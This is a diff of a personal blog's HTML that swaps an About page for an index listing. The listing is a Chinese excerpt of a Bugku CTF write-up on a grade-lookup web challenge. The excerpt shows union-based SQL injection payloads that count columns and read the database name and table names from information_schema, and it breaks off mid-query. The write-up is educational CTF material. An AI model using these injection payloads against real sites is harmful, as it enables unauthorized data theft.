@@ -203,8 +203,6 @@
 </head>
 
     
-        <body class="about-body">
-    
     
 <header class="header">
 
@@ -222,22 +220,16 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/21.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            About
             
         </h1>
         <!-- 副标题 -->
@@ -346,13 +338,42 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <!-- 不可以删除，否则会调用post的layout  -->
-<main class="main about-page">
-    <article class="article-entry">
-        <p>Money is not the only answer, <br>but it trully makes a big difference. </p>
-<p>无道人之短，无说己之长。<br>行之苟有恒，久久自芬芳。</p>
-
+            <main class="main index-page">
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/10/08/wp/" >
+            
+                <span>bugku write-up</span>
+        </a>
+        <div class="abstract-content">
+            web成绩查询先试试id=1正常输出，然后试试id=1’没有东西输出，再试试注释之后id=1’#又可以正常显示，这一题没有什么难点，也没有过滤，就是按照正常的步骤一步一步下来就行
+id=1&apos; order by 4#   //猜测列数，4列。
+id=-1&apos; union select 1,database(),2,3 #  //爆数据库名 skctf_flag
+id=-1&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=d...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/08</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "write-up">write-up</a>
+    
+</div>
+            
+        </div>
     </article>
+    
+    <!-- paginator  -->
+    
 </main>
             <!-- profile -->
             
